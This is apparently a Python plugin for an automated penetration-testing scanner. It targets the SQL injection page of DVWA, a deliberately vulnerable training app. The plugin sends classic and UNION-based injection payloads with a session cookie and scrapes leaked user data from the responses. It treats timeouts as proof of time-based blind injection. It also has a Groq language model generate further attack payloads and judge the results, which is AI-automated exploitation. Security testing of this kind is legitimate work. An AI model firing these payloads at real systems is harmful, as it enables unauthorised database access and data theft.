import urllib.request
import urllib.parse
import urllib.error
import socket
import re
import time
from typing import Dict, Any
from plugins.base_plugin import BasePlugin
from ai_self_validation import groq_generate_payloads, groq_evaluate_results

class DVWASQLiPlugin(BasePlugin):
    @property
    def METADATA(self) -> Dict[str, Any]:
        return {
            "id": "DVWA-SQLI",
            "name": "DVWA SQL Injection",
            "cvss_score": 9.8,
            "service": "http",
            "vuln_type": "sqli"
        }

    def match(self, service_info: Dict[str, Any]) -> bool:
        return service_info.get("service","") in ["http","https"]

    def _send_payload(self, base_url, payload, cookie):
        """Gửi payload GET, xử lý Timeout cho Time-based Blind SQLi và làm sạch Output"""
        try:
            encoded_payload = urllib.parse.quote(payload)
            url = f"{base_url}?id={encoded_payload}&Submit=Submit"
            
            req = urllib.request.Request(url)
            req.add_header("Cookie", cookie)
            t0 = time.time()
            
            resp = urllib.request.urlopen(req, timeout=5)
            elapsed = round(time.time() - t0, 3)
            body = resp.read().decode('utf-8')
            
            # Tìm kiếm thông tin user bị rò rỉ (Union-based / Error-based)
            dump_data = re.findall(r'<pre>(.*?)</pre>', body, re.DOTALL)
            output = " | ".join([d.strip().replace('<br />', '') for d in dump_data])
            
            return {"output": output, "response_time": elapsed, "error": None}
            
        except urllib.error.URLError as e:
            if isinstance(e.reason, socket.timeout):
                return {
                    "output": "[SYSTEM_TIMEOUT: Phản hồi > 5s. Lệnh SLEEP() trong SQL đã được thực thi thành công (Time-based Blind SQLi)!]", 
                    "response_time": 5.0, 
                    "error": None
                }
            return {"output": "", "response_time": -1, "error": str(e)}
        except socket.timeout:
            return {
                "output": "[SYSTEM_TIMEOUT: Phản hồi > 5s. Lệnh SLEEP() trong SQL đã được thực thi thành công (Time-based Blind SQLi)!]", 
                "response_time": 5.0, 
                "error": None
            }
        except Exception as e:
            return {"output": "", "response_time": -1, "error": str(e)}

    def verify(self, target_ip: str, target_port: int, context: Dict[str, Any]) -> Dict[str, Any]:
        cookie = context.get("session_cookie","")
        if not cookie:
            return {"status": "PENDING", "evidence": "Chưa có session cookie"}

        url = f"http://{target_ip}:{target_port}/vulnerabilities/sqli/"
        all_results = []

        initial_payloads = [
            ("1' OR '1'='1", "Classic OR Auth Bypass"),
            ("1' UNION SELECT null, user()#", "Union Select User"),
        ]

        print(f"      [SQLi] PHASE 1: Thử payload từ knowledge base...")
        initial_confirmed = None
        for payload, technique in initial_payloads:
            print(f"      [SQLi] [{technique}] Payload: {payload}")
            result = self._send_payload(url, payload, cookie)
            marker_hit = "First name" in result["output"] or "admin" in result["output"]
            status = "HIT" if marker_hit else "MISS"
            print(f"      [SQLi] Response time: {result['response_time']}s | Status: {status}")
            
            all_results.append({
                "phase": "initial", "technique": technique, "payload": payload,
                "output": result["output"][:200], "response_time": result["response_time"], "hit": marker_hit
            })
            if marker_hit and not initial_confirmed:
                initial_confirmed = {"payload": payload, "output": result["output"], "technique": technique}

        if not initial_confirmed:
            return {"status": "FALSE_POSITIVE", "evidence": "Tất cả SQLi payload ban đầu thất bại"}

        print(f"\n      [SQLi] PHASE 2: AI Groq suy luận và sinh payload bổ sung...")
        ai_plan = groq_generate_payloads("DVWA-SQLI", "http sql injection", url, initial_confirmed)

        print(f"\n      [SQLi] PHASE 2a & 2b: Thực thi payload AI & Kiểm tra Honeypot...")
        test_payloads = ai_plan.get("confirm_payloads", []) + ai_plan.get("honeypot_payloads", [])
        for p in test_payloads:
            payload, purpose = p.get("payload",""), p.get("purpose","")
            print(f"      [SQLi] [AI Test] Payload: {payload}")
            result = self._send_payload(url, payload, cookie)
            hit = "First name" in result["output"] or "SYSTEM_TIMEOUT" in result["output"]
            if result["output"]: print(f"      [SQLi] Output: {result['output'][:100]}...")
            
            all_results.append({
                "phase": "ai_test", "purpose": purpose, "payload": payload,
                "output": result["output"][:200], "response_time": result["response_time"], "hit": hit
            })

        print(f"\n      [SQLi] PHASE 3: AI đánh giá tổng hợp tất cả kết quả...")
        verdict = groq_evaluate_results("DVWA-SQLI", all_results, ai_plan.get("honeypot_suspicion","low"))
        
        final_status = verdict.get("verdict","PENDING")
        if final_status == "HONEYPOT_SUSPECTED": final_status = "PENDING"

        valuable_hits = [r for r in all_results if r["hit"] and ("First name" in r["output"] or "SYSTEM_TIMEOUT" in r["output"])]
        best_hit = valuable_hits[0] if valuable_hits else initial_confirmed

        return {
            "status": final_status,
            "evidence": (
                f"SQL Injection — AI Self-Validation hoàn tất.\n"
                f"      - Payload tốt nhất   : {best_hit['payload']}\n"
                f"      - Mục đích           : {best_hit.get('technique', best_hit.get('purpose'))}\n"
                f"      - Output trích xuất  : {best_hit['output'][:150].strip()}\n"
                f"      - AI Reasoning       : {verdict.get('final_reasoning')}"
            )
        }
